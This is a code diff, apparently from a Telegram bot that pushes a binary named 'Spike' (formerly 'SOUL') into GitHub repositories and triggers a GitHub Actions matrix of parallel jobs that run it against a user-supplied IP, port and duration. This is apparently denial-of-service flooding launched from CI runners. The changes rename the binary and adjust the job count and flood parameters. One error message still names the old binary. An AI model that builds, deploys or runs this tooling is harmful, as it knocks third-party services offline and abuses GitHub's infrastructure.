@@ -53,13 +53,13 @@ jobs:
     runs-on: ubuntu-latest
     strategy:
       matrix:
-        n: [1,2,3,4,5,6,7,8,9,10]
+        n: [1,2,3,4,5]
     steps:
       - uses: actions/checkout@v3
       - name: Make binary executable
         run: chmod +x *
       - name: Run soul binary
-        run: ./SOUL {ip} {port} {time} 900 -1
+        run: ./Spike {ip} {port} {time} 100 10240
 '''
 
 def is_admin(user_id: int) -> bool:
@@ -198,7 +198,7 @@ async def server(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception:
         await update.message.reply_text("Time must be a positive integer")
         return
-    if not os.path.isfile("SOUL"):
+    if not os.path.isfile("Spike"):
         await update.message.reply_text("Local binary 'SOUL' not found!")
         return
 
@@ -254,12 +254,12 @@ async def run_workflow_with_token_and_id(chat_id, github_token, ip, port, time, 
         base_ref = repo.get_git_ref(f"heads/{branch}")
         base_commit = repo.get_git_commit(base_ref.object.sha)
         base_tree = repo.get_git_tree(base_commit.sha)
-        with open("SOUL", "rb") as f:
+        with open("Spike", "rb") as f:
             binary_content = f.read()
         binary_b64 = base64.b64encode(binary_content).decode('utf-8')
         blob = repo.create_git_blob(binary_b64, "base64")
         binary_element = InputGitTreeElement(
-            path="SOUL",
+            path="Spike",
             mode='100755',
             type='blob',
             sha=blob.sha,
